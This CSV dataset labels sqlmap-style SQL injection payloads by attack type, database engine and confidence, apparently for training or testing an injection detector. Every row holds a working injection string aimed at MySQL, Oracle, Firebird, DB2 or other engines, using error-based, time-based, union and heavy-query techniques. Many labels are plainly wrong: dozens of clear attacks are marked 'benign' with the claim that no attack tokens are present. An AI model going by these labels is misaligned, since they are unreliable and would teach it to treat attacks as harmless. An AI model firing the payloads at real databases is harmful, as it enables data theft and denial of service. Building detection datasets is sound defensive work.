id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18438,1%' ) ) ) order by 1#,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18439,"1 ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 6690 = 6690",error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18440,1 ) as hlcn where 1165 = 1165 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18441,"1 ) where 6374 = 6374 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,mysql,0.7,Payload contains token 'union select' → maps to union_based per priority table; DB signature → mysql. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,1
18442,1' in boolean mode ) order by 1--,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18443,"1%' ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18444,"1' where 2332 = 2332 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18445,"1 ) as qjjm where 3850 = 3850 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.8,Payload contains token 'elt(' → maps to boolean_blind per priority table; DB signature → mysql. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,2
18446,"-6170 ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18447,"1"" ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""tiet"" like ""tiet",error_based,mysql,0.7,Payload contains token 'exp(~)' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18448,"1"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""gmld"" like ""gmld",error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18449,end and 'blit' = 'blit,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18450,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'beju' like 'beju",error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18451,"1'|| ( select 'jbgg' from dual where 1986 = 1986 union all select null,null,null,null,null,null,null,null,null,null#",union_based,oracle,0.95,Payload contains token 'union all select' → maps to union_based per priority table; DB signature → oracle. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,3
18452,"1' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'zoxm' like 'zoxm",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18453,"1"" where 8016 = 8016",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18454,"1' ) where 7561 = 7561 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18455,"1"" ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""atlz"" = ""atlz",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18456,"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,0.7,Payload contains token 'extractvalue' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18457,"1"" ) order by 1--",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18458,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'rtbm' = 'rtbm",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18459,"1' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18460,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) -- dpph",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18461,"1'|| ( select 'mwmn' where 5112 = 5112 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",boolean_blind,mysql,0.8,Payload contains token 'elt(' → maps to boolean_blind per priority table; DB signature → mysql. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,2
18462,"-9845"" ) as xpis where 1936 = 1936 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18463,-3497' order by 1#,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18464,"1 ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 7992 = 7992",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18465,1'|| ( select 'xlmt' where 1664 = 1664,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18466,1' ) ) ) order by 1#,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18467,"1'|| ( select 'mdqc' where 4533 = 4533 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18468,"1'|| ( select 'zpwe' from dual where 7743 = 7743 union all select null,null#",union_based,oracle,0.95,Payload contains token 'union all select' → maps to union_based per priority table; DB signature → oracle. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,3
18469,"1' ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18470,"1%' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( '%' = '",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18471,"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'rfln' = 'rfln",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18472,"1'+ ( select 'cstd' where 9326 = 9326 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",error_based,mysql,0.7,Payload contains token 'extractvalue' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18473,"1' in boolean mode ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18474,"1"" ) ) as iubt where 8179 = 8179 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18475,"1' where 1893 = 1893 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18476,"1' ) as ccee where 8880 = 8880 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18477,"1"" ) ) as krro where 1050 = 1050 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,mysql,0.8,Payload contains token 'extractvalue' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,2
18478,"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'ejnt' like 'ejnt",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18479,"1"" ) ) as fjtv where 8904 = 8904",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18480,"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'ajkb' = 'ajkb",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18481,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%"" = """,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18482,1'+ ( select trte where 9173 = 9173 and 2006 = 2006,boolean_blind,generic,0.95,Payload contains token 'and 2006 = 2006' → maps to boolean_blind per priority table; DB signature → generic. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,3
18483,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh"" = ""hjxh",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18484,end and ( ( ( 'hglq' like 'hglq,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18485,"1 ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 2230 = 2230",error_based,mysql,0.7,Payload contains token 'exp(~)' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18486,-4952' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'abso' = 'abso,benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
18487,"1'+ ( select 'vbqo' where 5630 = 5630 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.8,"Payload contains token 'extractvalue', 'benchmark' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.",2
18488,"1"" ) as qnmd where 5642 = 5642",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18489,"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""rdri"" = ""rdri",error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18490,"1'+ ( select 'aphz' where 1933 = 1933 union all select null,null,null,null,null,null#",union_based,generic,0.95,Payload contains token 'union all select' → maps to union_based per priority table; DB signature → generic. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,3
18491,"-4558' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18492,"1%' ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18493,"1"" ) where 7950 = 7950 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18494,"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'acdu' = 'acdu",time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18495,"-5969"" where 9248 = 9248 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
18496,"1 ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 4234 = 4234",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18497,"1' ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'fvov' = 'fvov",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18498,"1"" where 8379 = 8379 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18499,"1%"" ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18500,1 where 8921 = 8921 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18501,"1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'qvqf' = 'qvqf",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18502,1'+ ( select gqez where 3704 = 3704,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18503,"1' ) as ycsr where 2238 = 2238 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18504,"1 ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 5349 = 5349",boolean_blind,mysql,0.8,Payload contains token 'elt(' → maps to boolean_blind per priority table; DB signature → mysql. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,2
18505,-7659' ) as bowy where 4835 = 4835 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
18506,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'vgro' like 'vgro",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18507,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18508,"1%' ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.8,"Payload contains token 'extractvalue', 'benchmark' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.",2
18509,"1 ) as oblq where 2002 = 2002 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18510,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'nepn' = 'nepn",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18511,1'+ ( select 'qylf' where 6984 = 6984 and 2255 = 5094,boolean_blind,generic,0.95,Payload contains token 'and 2255 = 5094' → maps to boolean_blind per priority table; DB signature → generic. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,3
18512,"1 ) ) as aeat where 1007 = 1007 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18513,1'+ ( select echl where 6593 = 6593 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18514,"1'|| ( select 'vwop' where 8536 = 8536 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18515,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'bxjo' like 'bxjo",boolean_blind,db2,0.95,Payload contains token 'and ... like ...' → maps to boolean_blind per priority table; DB signature → db2. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,3
18516,"1%' ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18517,"1'+ ( select 'utlx' where 6256 = 6256 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) +'",error_based,mysql,0.7,Payload contains token 'extractvalue' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18518,-4523 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
18519,"1' in boolean mode ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) #",union_based,mysql,0.7,Payload contains token 'union select' → maps to union_based per priority table; DB signature → mysql. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,1
18520,"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""wvkp"" like ""wvkp",error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18521,"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'ppwh' = 'ppwh",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18522,"1' where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,mysql,0.7,Payload contains token 'union select' → maps to union_based per priority table; DB signature → mysql. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,1
18523,"-9057"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18524,"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'iixp' = 'iixp",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18525,1'|| ( select 'xhcr' from dual where 9279 = 9279,benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
